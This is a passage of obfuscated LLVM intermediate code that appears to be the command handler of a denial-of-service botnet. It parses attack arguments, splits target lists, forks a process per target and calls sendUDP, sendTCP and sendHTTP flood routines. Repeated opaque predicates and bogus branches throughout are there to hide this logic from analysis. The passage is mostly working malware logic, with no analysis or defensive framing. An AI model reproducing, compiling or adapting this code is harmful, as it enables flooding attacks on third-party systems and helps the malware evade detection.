  %856 = icmp sgt i32 %855, 7
  br i1 %856, label %857, label %878

; <label>:857:                                    ; preds = %853
  %858 = load i32, i32* @x.103
  %859 = load i32, i32* @y.104
  %860 = sub i32 %858, 1
  %861 = mul i32 %858, %860
  %862 = urem i32 %861, 2
  %863 = icmp eq i32 %862, 0
  %864 = icmp slt i32 %859, 10
  %865 = or i1 %863, %864
  br i1 %865, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %857
  %866 = load i8**, i8*** %4, align 8
  %867 = getelementptr inbounds i8*, i8** %866, i64 7
  %868 = load i8*, i8** %867, align 8
  %869 = call i32 @atoi(i8* %868) #10
  %870 = load i32, i32* @x.103
  %871 = load i32, i32* @y.104
  %872 = sub i32 %870, 1
  %873 = mul i32 %870, %872
  %874 = urem i32 %873, 2
  %875 = icmp eq i32 %874, 0
  %876 = icmp slt i32 %871, 10
  %877 = or i1 %875, %876
  br i1 %877, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %879

; <label>:878:                                    ; preds = %853
  br label %879

; <label>:879:                                    ; preds = %878, %originalBBpart296
  %880 = phi i32 [ %869, %originalBBpart296 ], [ 1000000, %878 ]
  store i32 %880, i32* %35, align 4
  %881 = load i32, i32* %3, align 4
  %882 = icmp sgt i32 %881, 8
  br i1 %882, label %883, label %888

; <label>:883:                                    ; preds = %879
  %884 = load i8**, i8*** %4, align 8
  %885 = getelementptr inbounds i8*, i8** %884, i64 8
  %886 = load i8*, i8** %885, align 8
  %887 = call i32 @atoi(i8* %886) #10
  br label %905

; <label>:888:                                    ; preds = %879
  %889 = load i32, i32* @x.103
  %890 = load i32, i32* @y.104
  %891 = sub i32 %889, 1
  %892 = mul i32 %889, %891
  %893 = urem i32 %892, 2
  %894 = icmp eq i32 %893, 0
  %895 = icmp slt i32 %890, 10
  %896 = or i1 %894, %895
  br i1 %896, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %888
  %897 = load i32, i32* @x.103
  %898 = load i32, i32* @y.104
  %899 = sub i32 %897, 1
  %900 = mul i32 %897, %899
  %901 = urem i32 %900, 2
  %902 = icmp eq i32 %901, 0
  %903 = icmp slt i32 %898, 10
  %904 = or i1 %902, %903
  br i1 %904, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %905

; <label>:905:                                    ; preds = %originalBBpart2100, %883
  %906 = phi i32 [ %887, %883 ], [ 0, %originalBBpart2100 ]
  store i32 %906, i32* %36, align 4
  %907 = load i8*, i8** %29, align 8
  %908 = call i8* @strstr(i8* %907, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %909 = icmp ne i8* %908, null
  br i1 %909, label %910, label %947

; <label>:910:                                    ; preds = %905
  %911 = load i8*, i8** %29, align 8
  %912 = call i8* @strtok(i8* %911, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %912, i8** %37, align 8
  br label %913

; <label>:913:                                    ; preds = %944, %910
  %914 = load i8*, i8** %37, align 8
  %915 = icmp ne i8* %914, null
  br i1 %915, label %916, label %946

; <label>:916:                                    ; preds = %913
  %917 = load i32, i32* @x.103
  %918 = load i32, i32* @y.104
  %919 = sub i32 %917, 1
  %920 = mul i32 %917, %919
  %921 = urem i32 %920, 2
  %922 = icmp eq i32 %921, 0
  %923 = icmp slt i32 %918, 10
  %924 = or i1 %922, %923
  br i1 %924, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %916
  %925 = call i32 @listFork()
  %926 = icmp ne i32 %925, 0
  %927 = load i32, i32* @x.103
  %928 = load i32, i32* @y.104
  %929 = sub i32 %927, 1
  %930 = mul i32 %927, %929
  %931 = urem i32 %930, 2
  %932 = icmp eq i32 %931, 0
  %933 = icmp slt i32 %928, 10
  %934 = or i1 %932, %933
  br i1 %934, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %926, label %944, label %935

; <label>:935:                                    ; preds = %originalBBpart2104
  %936 = load i8*, i8** %37, align 8
  %937 = load i32, i32* %30, align 4
  %938 = load i32, i32* %31, align 4
  %939 = load i32, i32* %32, align 4
  %940 = load i32, i32* %33, align 4
  %941 = load i32, i32* %34, align 4
  %942 = load i32, i32* %35, align 4
  %943 = load i32, i32* %36, align 4
  call void @sendUDP(i8* %936, i32 %937, i32 %938, i32 %939, i32 %940, i32 %941, i32 %942, i32 %943)
  call void @_exit(i32 0) #12
  unreachable

; <label>:944:                                    ; preds = %originalBBpart2104
  %945 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %945, i8** %37, align 8
  br label %913

; <label>:946:                                    ; preds = %913
  br label %976

; <label>:947:                                    ; preds = %905
  %948 = load i32, i32* @x.103
  %949 = load i32, i32* @y.104
  %950 = sub i32 %948, 1
  %951 = mul i32 %948, %950
  %952 = urem i32 %951, 2
  %953 = icmp eq i32 %952, 0
  %954 = icmp slt i32 %949, 10
  %955 = or i1 %953, %954
  br i1 %955, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %947
  %956 = call i32 @listFork()
  %957 = icmp ne i32 %956, 0
  %958 = load i32, i32* @x.103
  %959 = load i32, i32* @y.104
  %960 = sub i32 %958, 1
  %961 = mul i32 %958, %960
  %962 = urem i32 %961, 2
  %963 = icmp eq i32 %962, 0
  %964 = icmp slt i32 %959, 10
  %965 = or i1 %963, %964
  br i1 %965, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %957, label %975, label %966

; <label>:966:                                    ; preds = %originalBBpart2108
  %967 = load i8*, i8** %29, align 8
  %968 = load i32, i32* %30, align 4
  %969 = load i32, i32* %31, align 4
  %970 = load i32, i32* %32, align 4
  %971 = load i32, i32* %33, align 4
  %972 = load i32, i32* %34, align 4
  %973 = load i32, i32* %35, align 4
  %974 = load i32, i32* %36, align 4
  call void @sendUDP(i8* %967, i32 %968, i32 %969, i32 %970, i32 %971, i32 %972, i32 %973, i32 %974)
  call void @_exit(i32 0) #12
  unreachable

; <label>:975:                                    ; preds = %originalBBpart2108
  br label %976

; <label>:976:                                    ; preds = %975, %946
  br label %1829

; <label>:977:                                    ; preds = %originalBBpart280
  %978 = load i8**, i8*** %4, align 8
  %979 = getelementptr inbounds i8*, i8** %978, i64 0
  %980 = load i8*, i8** %979, align 8
  %981 = call i32 @strcmp(i8* %980, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.530, i32 0, i32 0)) #10
  %982 = icmp ne i32 %981, 0
  br i1 %982, label %1280, label %983

; <label>:983:                                    ; preds = %977
  %984 = load i32, i32* %3, align 4
  %985 = icmp slt i32 %984, 6
  br i1 %985, label %1076, label %986

; <label>:986:                                    ; preds = %983
  %987 = load i32, i32* @x.103
  %988 = load i32, i32* @y.104
  %989 = sub i32 %987, 1
  %990 = mul i32 %987, %989
  %991 = urem i32 %990, 2
  %992 = icmp eq i32 %991, 0
  %993 = icmp slt i32 %988, 10
  %994 = or i1 %992, %993
  br i1 %994, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %986
  %995 = load i8**, i8*** %4, align 8
  %996 = getelementptr inbounds i8*, i8** %995, i64 3
  %997 = load i8*, i8** %996, align 8
  %998 = call i32 @atoi(i8* %997) #10
  %999 = icmp eq i32 %998, -1
  %1000 = load i32, i32* @x.103
  %1001 = load i32, i32* @y.104
  %1002 = sub i32 %1000, 1
  %1003 = mul i32 %1000, %1002
  %1004 = urem i32 %1003, 2
  %1005 = icmp eq i32 %1004, 0
  %1006 = icmp slt i32 %1001, 10
  %1007 = or i1 %1005, %1006
  br i1 %1007, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %999, label %1076, label %1008

; <label>:1008:                                   ; preds = %originalBBpart2112
  %1009 = load i8**, i8*** %4, align 8
  %1010 = getelementptr inbounds i8*, i8** %1009, i64 2
  %1011 = load i8*, i8** %1010, align 8
  %1012 = call i32 @atoi(i8* %1011) #10
  %1013 = icmp eq i32 %1012, -1
  br i1 %1013, label %1076, label %1014

; <label>:1014:                                   ; preds = %1008
  %1015 = load i32, i32* @x.103
  %1016 = load i32, i32* @y.104
  %1017 = sub i32 %1015, 1
  %1018 = mul i32 %1015, %1017
  %1019 = urem i32 %1018, 2
  %1020 = icmp eq i32 %1019, 0
  %1021 = icmp slt i32 %1016, 10
  %1022 = or i1 %1020, %1021
  br i1 %1022, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %1014
  %1023 = load i8**, i8*** %4, align 8
  %1024 = getelementptr inbounds i8*, i8** %1023, i64 4
  %1025 = load i8*, i8** %1024, align 8
  %1026 = call i32 @atoi(i8* %1025) #10
  %1027 = icmp eq i32 %1026, -1
  %1028 = load i32, i32* @x.103
  %1029 = load i32, i32* @y.104
  %1030 = sub i32 %1028, 1
  %1031 = mul i32 %1028, %1030
  %1032 = urem i32 %1031, 2
  %1033 = icmp eq i32 %1032, 0
  %1034 = icmp slt i32 %1029, 10
  %1035 = or i1 %1033, %1034
  br i1 %1035, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %1027, label %1076, label %1036

; <label>:1036:                                   ; preds = %originalBBpart2116
  %1037 = load i8**, i8*** %4, align 8
  %1038 = getelementptr inbounds i8*, i8** %1037, i64 4
  %1039 = load i8*, i8** %1038, align 8
  %1040 = call i32 @atoi(i8* %1039) #10
  %1041 = icmp sgt i32 %1040, 32
  br i1 %1041, label %1076, label %1042

; <label>:1042:                                   ; preds = %1036
  %1043 = load i32, i32* %3, align 4
  %1044 = icmp sgt i32 %1043, 6
  br i1 %1044, label %1045, label %1067

; <label>:1045:                                   ; preds = %1042
  %1046 = load i32, i32* @x.103
  %1047 = load i32, i32* @y.104
  %1048 = sub i32 %1046, 1
  %1049 = mul i32 %1046, %1048
  %1050 = urem i32 %1049, 2
  %1051 = icmp eq i32 %1050, 0
  %1052 = icmp slt i32 %1047, 10
  %1053 = or i1 %1051, %1052
  br i1 %1053, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %1045
  %1054 = load i8**, i8*** %4, align 8
  %1055 = getelementptr inbounds i8*, i8** %1054, i64 6
  %1056 = load i8*, i8** %1055, align 8
  %1057 = call i32 @atoi(i8* %1056) #10
  %1058 = icmp slt i32 %1057, 0
  %1059 = load i32, i32* @x.103
  %1060 = load i32, i32* @y.104
  %1061 = sub i32 %1059, 1
  %1062 = mul i32 %1059, %1061
  %1063 = urem i32 %1062, 2
  %1064 = icmp eq i32 %1063, 0
  %1065 = icmp slt i32 %1060, 10
  %1066 = or i1 %1064, %1065
  br i1 %1066, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %1058, label %1076, label %1067

; <label>:1067:                                   ; preds = %originalBBpart2120, %1042
  %1068 = load i32, i32* %3, align 4
  %1069 = icmp eq i32 %1068, 8
  br i1 %1069, label %1070, label %1077

; <label>:1070:                                   ; preds = %1067
  %1071 = load i8**, i8*** %4, align 8
  %1072 = getelementptr inbounds i8*, i8** %1071, i64 7
  %1073 = load i8*, i8** %1072, align 8
  %1074 = call i32 @atoi(i8* %1073) #10
  %1075 = icmp slt i32 %1074, 1
  br i1 %1075, label %1076, label %1077

; <label>:1076:                                   ; preds = %1070, %originalBBpart2120, %1036, %originalBBpart2116, %1008, %originalBBpart2112, %983
  br label %1829

; <label>:1077:                                   ; preds = %1070, %1067
  %1078 = load i8**, i8*** %4, align 8
  %1079 = getelementptr inbounds i8*, i8** %1078, i64 1
  %1080 = load i8*, i8** %1079, align 8
  store i8* %1080, i8** %38, align 8
  %1081 = load i8**, i8*** %4, align 8
  %1082 = getelementptr inbounds i8*, i8** %1081, i64 2
  %1083 = load i8*, i8** %1082, align 8
  %1084 = call i32 @atoi(i8* %1083) #10
  store i32 %1084, i32* %39, align 4
  %1085 = load i8**, i8*** %4, align 8
  %1086 = getelementptr inbounds i8*, i8** %1085, i64 3
  %1087 = load i8*, i8** %1086, align 8
  %1088 = call i32 @atoi(i8* %1087) #10
  store i32 %1088, i32* %40, align 4
  %1089 = load i8**, i8*** %4, align 8
  %1090 = getelementptr inbounds i8*, i8** %1089, i64 4
  %1091 = load i8*, i8** %1090, align 8
  %1092 = call i32 @atoi(i8* %1091) #10
  store i32 %1092, i32* %41, align 4
  %1093 = load i8**, i8*** %4, align 8
  %1094 = getelementptr inbounds i8*, i8** %1093, i64 5
  %1095 = load i8*, i8** %1094, align 8
  store i8* %1095, i8** %42, align 8
  %1096 = load i32, i32* %3, align 4
  %1097 = icmp eq i32 %1096, 8
  br i1 %1097, label %1098, label %1119

; <label>:1098:                                   ; preds = %1077
  %1099 = load i32, i32* @x.103
  %1100 = load i32, i32* @y.104
  %1101 = sub i32 %1099, 1
  %1102 = mul i32 %1099, %1101
  %1103 = urem i32 %1102, 2
  %1104 = icmp eq i32 %1103, 0
  %1105 = icmp slt i32 %1100, 10
  %1106 = or i1 %1104, %1105
  br i1 %1106, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1098
  %1107 = load i8**, i8*** %4, align 8
  %1108 = getelementptr inbounds i8*, i8** %1107, i64 7
  %1109 = load i8*, i8** %1108, align 8
  %1110 = call i32 @atoi(i8* %1109) #10
  %1111 = load i32, i32* @x.103
  %1112 = load i32, i32* @y.104
  %1113 = sub i32 %1111, 1
  %1114 = mul i32 %1111, %1113
  %1115 = urem i32 %1114, 2
  %1116 = icmp eq i32 %1115, 0
  %1117 = icmp slt i32 %1112, 10
  %1118 = or i1 %1116, %1117
  br i1 %1118, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %1120

; <label>:1119:                                   ; preds = %1077
  br label %1120

; <label>:1120:                                   ; preds = %1119, %originalBBpart2124
  %1121 = phi i32 [ %1110, %originalBBpart2124 ], [ 10, %1119 ]
  %1122 = load i32, i32* @x.103
  %1123 = load i32, i32* @y.104
  %1124 = sub i32 %1122, 1
  %1125 = mul i32 %1122, %1124
  %1126 = urem i32 %1125, 2
  %1127 = icmp eq i32 %1126, 0
  %1128 = icmp slt i32 %1123, 10
  %1129 = or i1 %1127, %1128
  br i1 %1129, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1120
  store i32 %1121, i32* %43, align 4
  %1130 = load i32, i32* %3, align 4
  %1131 = icmp sgt i32 %1130, 6
  %1132 = load i32, i32* @x.103
  %1133 = load i32, i32* @y.104
  %1134 = sub i32 %1132, 1
  %1135 = mul i32 %1132, %1134
  %1136 = urem i32 %1135, 2
  %1137 = icmp eq i32 %1136, 0
  %1138 = icmp slt i32 %1133, 10
  %1139 = or i1 %1137, %1138
  br i1 %1139, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %1131, label %1140, label %1145

; <label>:1140:                                   ; preds = %originalBBpart2128
  %1141 = load i8**, i8*** %4, align 8
  %1142 = getelementptr inbounds i8*, i8** %1141, i64 6
  %1143 = load i8*, i8** %1142, align 8
  %1144 = call i32 @atoi(i8* %1143) #10
  br label %1162

; <label>:1145:                                   ; preds = %originalBBpart2128
  %1146 = load i32, i32* @x.103
  %1147 = load i32, i32* @y.104
  %1148 = sub i32 %1146, 1
  %1149 = mul i32 %1146, %1148
  %1150 = urem i32 %1149, 2
  %1151 = icmp eq i32 %1150, 0
  %1152 = icmp slt i32 %1147, 10
  %1153 = or i1 %1151, %1152
  br i1 %1153, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1145
  %1154 = load i32, i32* @x.103
  %1155 = load i32, i32* @y.104
  %1156 = sub i32 %1154, 1
  %1157 = mul i32 %1154, %1156
  %1158 = urem i32 %1157, 2
  %1159 = icmp eq i32 %1158, 0
  %1160 = icmp slt i32 %1155, 10
  %1161 = or i1 %1159, %1160
  br i1 %1161, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1162

; <label>:1162:                                   ; preds = %originalBBpart2132, %1140
  %1163 = phi i32 [ %1144, %1140 ], [ 0, %originalBBpart2132 ]
  %1164 = load i32, i32* @x.103
  %1165 = load i32, i32* @y.104
  %1166 = sub i32 %1164, 1
  %1167 = mul i32 %1164, %1166
  %1168 = urem i32 %1167, 2
  %1169 = icmp eq i32 %1168, 0
  %1170 = icmp slt i32 %1165, 10
  %1171 = or i1 %1169, %1170
  br i1 %1171, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1162
  store i32 %1163, i32* %44, align 4
  %1172 = load i8*, i8** %38, align 8
  %1173 = call i8* @strstr(i8* %1172, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %1174 = icmp ne i8* %1173, null
  %1175 = load i32, i32* @x.103
  %1176 = load i32, i32* @y.104
  %1177 = sub i32 %1175, 1
  %1178 = mul i32 %1175, %1177
  %1179 = urem i32 %1178, 2
  %1180 = icmp eq i32 %1179, 0
  %1181 = icmp slt i32 %1176, 10
  %1182 = or i1 %1180, %1181
  br i1 %1182, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1174, label %1183, label %1235

; <label>:1183:                                   ; preds = %originalBBpart2136
  %1184 = load i8*, i8** %38, align 8
  %1185 = call i8* @strtok(i8* %1184, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %1185, i8** %45, align 8
  br label %1186

; <label>:1186:                                   ; preds = %1216, %1183
  %1187 = load i32, i32* @x.103
  %1188 = load i32, i32* @y.104
  %1189 = sub i32 %1187, 1
  %1190 = mul i32 %1187, %1189
  %1191 = urem i32 %1190, 2
  %1192 = icmp eq i32 %1191, 0
  %1193 = icmp slt i32 %1188, 10
  %1194 = or i1 %1192, %1193
  br i1 %1194, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1186
  %1195 = load i8*, i8** %45, align 8
  %1196 = icmp ne i8* %1195, null
  %1197 = load i32, i32* @x.103
  %1198 = load i32, i32* @y.104
  %1199 = sub i32 %1197, 1
  %1200 = mul i32 %1197, %1199
  %1201 = urem i32 %1200, 2
  %1202 = icmp eq i32 %1201, 0
  %1203 = icmp slt i32 %1198, 10
  %1204 = or i1 %1202, %1203
  br i1 %1204, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br i1 %1196, label %1205, label %1218

; <label>:1205:                                   ; preds = %originalBBpart2140
  %1206 = call i32 @listFork()
  %1207 = icmp ne i32 %1206, 0
  br i1 %1207, label %1216, label %1208

; <label>:1208:                                   ; preds = %1205
  %1209 = load i8*, i8** %45, align 8
  %1210 = load i32, i32* %39, align 4
  %1211 = load i32, i32* %40, align 4
  %1212 = load i32, i32* %41, align 4
  %1213 = load i8*, i8** %42, align 8
  %1214 = load i32, i32* %44, align 4
  %1215 = load i32, i32* %43, align 4
  call void @sendTCP(i8* %1209, i32 %1210, i32 %1211, i32 %1212, i8* %1213, i32 %1214, i32 %1215)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1216:                                   ; preds = %1205
  %1217 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %1217, i8** %45, align 8
  br label %1186

; <label>:1218:                                   ; preds = %originalBBpart2140
  %1219 = load i32, i32* @x.103
  %1220 = load i32, i32* @y.104
  %1221 = sub i32 %1219, 1
  %1222 = mul i32 %1219, %1221
  %1223 = urem i32 %1222, 2
  %1224 = icmp eq i32 %1223, 0
  %1225 = icmp slt i32 %1220, 10
  %1226 = or i1 %1224, %1225
  br i1 %1226, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1218
  %1227 = load i32, i32* @x.103
  %1228 = load i32, i32* @y.104
  %1229 = sub i32 %1227, 1
  %1230 = mul i32 %1227, %1229
  %1231 = urem i32 %1230, 2
  %1232 = icmp eq i32 %1231, 0
  %1233 = icmp slt i32 %1228, 10
  %1234 = or i1 %1232, %1233
  br i1 %1234, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1279

; <label>:1235:                                   ; preds = %originalBBpart2136
  %1236 = load i32, i32* @x.103
  %1237 = load i32, i32* @y.104
  %1238 = sub i32 %1236, 1
  %1239 = mul i32 %1236, %1238
  %1240 = urem i32 %1239, 2
  %1241 = icmp eq i32 %1240, 0
  %1242 = icmp slt i32 %1237, 10
  %1243 = or i1 %1241, %1242
  br i1 %1243, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1235
  %1244 = call i32 @listFork()
  %1245 = icmp ne i32 %1244, 0
  %1246 = load i32, i32* @x.103
  %1247 = load i32, i32* @y.104
  %1248 = sub i32 %1246, 1
  %1249 = mul i32 %1246, %1248
  %1250 = urem i32 %1249, 2
  %1251 = icmp eq i32 %1250, 0
  %1252 = icmp slt i32 %1247, 10
  %1253 = or i1 %1251, %1252
  br i1 %1253, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1245, label %1262, label %1254

; <label>:1254:                                   ; preds = %originalBBpart2148
  %1255 = load i8*, i8** %38, align 8
  %1256 = load i32, i32* %39, align 4
  %1257 = load i32, i32* %40, align 4
  %1258 = load i32, i32* %41, align 4
  %1259 = load i8*, i8** %42, align 8
  %1260 = load i32, i32* %44, align 4
  %1261 = load i32, i32* %43, align 4
  call void @sendTCP(i8* %1255, i32 %1256, i32 %1257, i32 %1258, i8* %1259, i32 %1260, i32 %1261)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1262:                                   ; preds = %originalBBpart2148
  %1263 = load i32, i32* @x.103
  %1264 = load i32, i32* @y.104
  %1265 = sub i32 %1263, 1
  %1266 = mul i32 %1263, %1265
  %1267 = urem i32 %1266, 2
  %1268 = icmp eq i32 %1267, 0
  %1269 = icmp slt i32 %1264, 10
  %1270 = or i1 %1268, %1269
  br i1 %1270, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1262
  %1271 = load i32, i32* @x.103
  %1272 = load i32, i32* @y.104
  %1273 = sub i32 %1271, 1
  %1274 = mul i32 %1271, %1273
  %1275 = urem i32 %1274, 2
  %1276 = icmp eq i32 %1275, 0
  %1277 = icmp slt i32 %1272, 10
  %1278 = or i1 %1276, %1277
  br i1 %1278, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1279

; <label>:1279:                                   ; preds = %originalBBpart2152, %originalBBpart2144
  br label %1280

; <label>:1280:                                   ; preds = %1279, %977
  %1281 = load i32, i32* @x.103
  %1282 = load i32, i32* @y.104
  %1283 = sub i32 %1281, 1
  %1284 = mul i32 %1281, %1283
  %1285 = urem i32 %1284, 2
  %1286 = icmp eq i32 %1285, 0
  %1287 = icmp slt i32 %1282, 10
  %1288 = or i1 %1286, %1287
  br i1 %1288, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1280
  %1289 = load i8**, i8*** %4, align 8
  %1290 = getelementptr inbounds i8*, i8** %1289, i64 0
  %1291 = load i8*, i8** %1290, align 8
  %1292 = call i32 @strcmp(i8* %1291, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.531, i32 0, i32 0)) #10
  %1293 = icmp ne i32 %1292, 0
  %1294 = load i32, i32* @x.103
  %1295 = load i32, i32* @y.104
  %1296 = sub i32 %1294, 1
  %1297 = mul i32 %1294, %1296
  %1298 = urem i32 %1297, 2
  %1299 = icmp eq i32 %1298, 0
  %1300 = icmp slt i32 %1295, 10
  %1301 = or i1 %1299, %1300
  br i1 %1301, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br i1 %1293, label %1409, label %1302

; <label>:1302:                                   ; preds = %originalBBpart2156
  %1303 = load i32, i32* %3, align 4
  %1304 = icmp slt i32 %1303, 6
  br i1 %1304, label %1305, label %1322

; <label>:1305:                                   ; preds = %1302
  %1306 = load i32, i32* @x.103
  %1307 = load i32, i32* @y.104
  %1308 = sub i32 %1306, 1
  %1309 = mul i32 %1306, %1308
  %1310 = urem i32 %1309, 2
  %1311 = icmp eq i32 %1310, 0
  %1312 = icmp slt i32 %1307, 10
  %1313 = or i1 %1311, %1312
  br i1 %1313, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1305
  %1314 = load i32, i32* @x.103
  %1315 = load i32, i32* @y.104
  %1316 = sub i32 %1314, 1
  %1317 = mul i32 %1314, %1316
  %1318 = urem i32 %1317, 2
  %1319 = icmp eq i32 %1318, 0
  %1320 = icmp slt i32 %1315, 10
  %1321 = or i1 %1319, %1320
  br i1 %1321, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br label %1829

; <label>:1322:                                   ; preds = %1302
  %1323 = load i8**, i8*** %4, align 8
  %1324 = getelementptr inbounds i8*, i8** %1323, i64 1
  %1325 = load i8*, i8** %1324, align 8
  %1326 = call i8* @strstr(i8* %1325, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %1327 = icmp ne i8* %1326, null
  br i1 %1327, label %1328, label %1381

; <label>:1328:                                   ; preds = %1322
  %1329 = load i8**, i8*** %4, align 8
  %1330 = getelementptr inbounds i8*, i8** %1329, i64 1
  %1331 = load i8*, i8** %1330, align 8
  %1332 = call i8* @strtok(i8* %1331, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %1332, i8** %46, align 8
  br label %1333

; <label>:1333:                                   ; preds = %originalBBpart2164, %1328
  %1334 = load i8*, i8** %46, align 8
  %1335 = icmp ne i8* %1334, null
  br i1 %1335, label %1336, label %1380

; <label>:1336:                                   ; preds = %1333
  %1337 = call i32 @listFork()
  %1338 = icmp ne i32 %1337, 0
  br i1 %1338, label %1362, label %1339

; <label>:1339:                                   ; preds = %1336
  %1340 = load i8**, i8*** %4, align 8
  %1341 = getelementptr inbounds i8*, i8** %1340, i64 1
  %1342 = load i8*, i8** %1341, align 8
  %1343 = load i8**, i8*** %4, align 8
  %1344 = getelementptr inbounds i8*, i8** %1343, i64 2
  %1345 = load i8*, i8** %1344, align 8
  %1346 = load i8**, i8*** %4, align 8
  %1347 = getelementptr inbounds i8*, i8** %1346, i64 3
  %1348 = load i8*, i8** %1347, align 8
  %1349 = call i32 @atoi(i8* %1348) #10
  %1350 = trunc i32 %1349 to i16
  %1351 = load i8**, i8*** %4, align 8
  %1352 = getelementptr inbounds i8*, i8** %1351, i64 4
  %1353 = load i8*, i8** %1352, align 8
  %1354 = load i8**, i8*** %4, align 8
  %1355 = getelementptr inbounds i8*, i8** %1354, i64 5
  %1356 = load i8*, i8** %1355, align 8
  %1357 = call i32 @atoi(i8* %1356) #10
  %1358 = load i8**, i8*** %4, align 8
  %1359 = getelementptr inbounds i8*, i8** %1358, i64 6
  %1360 = load i8*, i8** %1359, align 8
  %1361 = call i32 @atoi(i8* %1360) #10
  call void @sendHTTP(i8* %1342, i8* %1345, i16 zeroext %1350, i8* %1353, i32 %1357, i32 %1361)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1362:                                   ; preds = %1336
  %1363 = load i32, i32* @x.103
  %1364 = load i32, i32* @y.104
  %1365 = sub i32 %1363, 1
  %1366 = mul i32 %1363, %1365
  %1367 = urem i32 %1366, 2
  %1368 = icmp eq i32 %1367, 0
  %1369 = icmp slt i32 %1364, 10
  %1370 = or i1 %1368, %1369
  br i1 %1370, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1362
  %1371 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %1371, i8** %46, align 8
  %1372 = load i32, i32* @x.103
  %1373 = load i32, i32* @y.104
  %1374 = sub i32 %1372, 1
  %1375 = mul i32 %1372, %1374
  %1376 = urem i32 %1375, 2
  %1377 = icmp eq i32 %1376, 0
  %1378 = icmp slt i32 %1373, 10
  %1379 = or i1 %1377, %1378
  br i1 %1379, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br label %1333

; <label>:1380:                                   ; preds = %1333
  br label %1408

; <label>:1381:                                   ; preds = %1322
  %1382 = call i32 @listFork()
  %1383 = icmp ne i32 %1382, 0
  br i1 %1383, label %1384, label %1385

; <label>:1384:                                   ; preds = %1381
  br label %1829

; <label>:1385:                                   ; preds = %1381
  %1386 = load i8**, i8*** %4, align 8
  %1387 = getelementptr inbounds i8*, i8** %1386, i64 1
  %1388 = load i8*, i8** %1387, align 8
  %1389 = load i8**, i8*** %4, align 8
  %1390 = getelementptr inbounds i8*, i8** %1389, i64 2
  %1391 = load i8*, i8** %1390, align 8
  %1392 = load i8**, i8*** %4, align 8
  %1393 = getelementptr inbounds i8*, i8** %1392, i64 3
